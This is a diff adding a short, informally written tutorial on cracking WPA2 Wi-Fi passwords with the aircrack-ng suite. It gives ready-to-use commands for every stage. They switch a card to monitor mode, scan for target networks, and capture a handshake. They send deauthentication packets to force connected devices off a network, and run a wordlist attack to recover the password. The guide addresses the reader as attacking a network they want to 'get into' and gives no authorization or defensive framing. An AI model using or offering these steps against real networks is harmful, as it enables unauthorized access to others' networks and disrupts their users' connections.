@@ -1,0 +1,56 @@
+Hello World!
+This is how to crack wifi manual (WPA2)
+
+//Step 1
+
+First u need to put the Wifi card into Monitor mode
+
+by using these commands
+
+ifconfig wlan0 down
+airmon-ng check kill
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+
+while (wlan0) is the Interface
+to see in which state the card is and whats how its named u can type iwconfig
+
+To scan the area with your wifi card type
+
+airodump-ng
+
+//Step 2
+
+Find information about the wifi u trying to get into
+
+when u type airodump-ng u can see all the networks that are in you area
+then u should see the BSSID and the Channel that u target is in
+write these 2 things down
+
+To crack a wifi u need to capture a "Handshake"
+to capture a handshake of the wifi u need to type in this command
+insert the 2 things u wrote down earlier in here
+
+airodump-ng -c {channel} --bssid {BSSID} -w {name of output file} {wifi card}
+
+//Step 3 Optional
+
+To speed up the capturing of the handshake a device needs to connect to the wifi
+so to kick all devices from the network type but let the windows can where u are
+currently in just open another terminal window
+5-10 deauth pakets should kick the device off
+
+aireplay-ng -0 {how many deauth pakets} -a {BSSID} {wifi card}
+
+u can also send the deauth pakage to a specific device in the network type
+
+aireplay-ng -0 {how many deauth pakets} -a {BSSID} -c {device id marked as STATION} {wifi card}
+
+//Step 4
+
+If you captured the handshake successfully type
+
+aircrack-ng -w {name and path of the word list} -b {BSSID} {file name of the outputfile from earlier}*.cap
+
+to crack the password
+but need a .txt file that contains words to hack the password
